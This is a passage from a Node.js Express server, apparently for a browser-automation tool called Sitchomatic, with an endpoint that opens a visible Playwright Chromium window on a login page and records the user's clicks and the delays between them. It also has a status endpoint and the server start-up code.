  }, count);
}

/**
 * GET /api/record-flow/status
 * Returns the current flow recording session state.
 * Response: { active: bool, count: number, selectors: string[], status: string, error: string }
 */
app.get('/api/record-flow/status', (req, res) => {
  if (!flowSession) return res.json({ active: false });
  res.json({
    active:    true,
    count:     flowSession.count || 0,
    selectors: flowSession.selectors,
    status:    flowSession.status,
    error:     flowSession.error || '',
  });
});

/**
 * POST /api/record-flow
 * Opens a headed (visible) Chromium browser on the login page and records an
 * unlimited number of user clicks until the user presses the "✓ Done" button
 * in the overlay bar. Each click's selector and timestamp are captured.
 *
 * After recording, delays between consecutive clicks are computed so the UI
 * can show timing analysis. The automation can use these delays to tune waits.
 *
 * Request body: { loginUrl: string }
 * Response:     { selectors: string[], delays: number[], count: number }
 *               or { error: string }
 */
app.post('/api/record-flow', async (req, res) => {
  const { loginUrl } = req.body;
  if (!loginUrl) return res.status(400).json({ error: 'Missing loginUrl' });
  if (flowSession && flowSession.status === 'recording') {
    return res.status(409).json({ error: 'A recording session is already active. Close the browser window first.' });
  }

  flowSession = { count: 0, selectors: [], delays: [], status: 'recording', error: '' };

  let browser;
  try {
    browser = await chromium.launch({ headless: false, args: ['--window-size=1280,800'] });
    const context = await browser.newContext({ viewport: { width: 1280, height: 800 } });
    const page = await context.newPage();

    await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await page.waitForTimeout(1500);

    // Inject initial overlay with Done button; no step limit
    await updateRecordingOverlay(page, 0);

    // Allow up to 10 minutes total for the user to complete their recording
    page.setDefaultTimeout(600000);

    const clicks = []; // { selector: string, ts: number }

    while (true) {
      const event = await waitForRecordedEvent(page).catch(() => null);

      // null (timeout/error) or explicit done → stop recording
      if (!event || event.done) break;

      clicks.push(event);
      flowSession.count     = clicks.length;
      flowSession.selectors = clicks.map(c => c.selector);

      // Update overlay badge to reflect the running click count
      await updateRecordingOverlay(page, clicks.length);
    }

    // Compute ms delay between each pair of consecutive clicks.
    // These can be used to tune automation timing for this specific site.
    const delays = [];
    for (let i = 1; i < clicks.length; i++) {
      delays.push(clicks[i].ts - clicks[i - 1].ts);
    }
    flowSession.delays = delays;

    // Show completion summary in the headed browser before it auto-closes
    const avgDelay = delays.length
      ? Math.round(delays.reduce((a, b) => a + b, 0) / delays.length)
      : 0;
    await page.evaluate(({ count, avgDelay }) => {
      const bar = document.getElementById('_sitcho_rec_bar');
      if (bar) {
        bar.style.cssText = bar.style.cssText.replace('#30d5c8', '#28a046')
          .replace('rgba(0,0,0,0.88)', 'rgba(52,199,89,0.95)');
        bar.style.background = 'rgba(52,199,89,0.95)';
        bar.style.color = '#000';
        bar.style.borderColor = '#28a046';
        bar.innerHTML =
          '<strong>✓ ' + count + ' click' + (count !== 1 ? 's' : '') + ' recorded!</strong>' +
          (avgDelay ? '  Avg delay between clicks: <strong>' + avgDelay + ' ms</strong>' : '') +
          '  You can close this window.';
      }
    }, { count: clicks.length, avgDelay });

    await page.waitForTimeout(2500);

    flowSession.status = 'done';
    res.json({ selectors: flowSession.selectors, delays, count: clicks.length });

  } catch (err) {
    flowSession.status = 'error';
    flowSession.error  = err.message;
    res.status(500).json({ error: err.message });
  } finally {
    if (browser) await browser.close().catch(() => {});
  }
});

// ── Start ─────────────────────────────────────────────────────────────────────

app.listen(PORT, () => {
  console.log(`Sitchomatic server running at http://localhost:${PORT}`);
  console.log(`  Webapp:  http://localhost:${PORT}/`);
  console.log(`  API:     http://localhost:${PORT}/api/status`);
  console.log(`  Mode:    LIVE browser automation (Playwright Chromium)`);
});
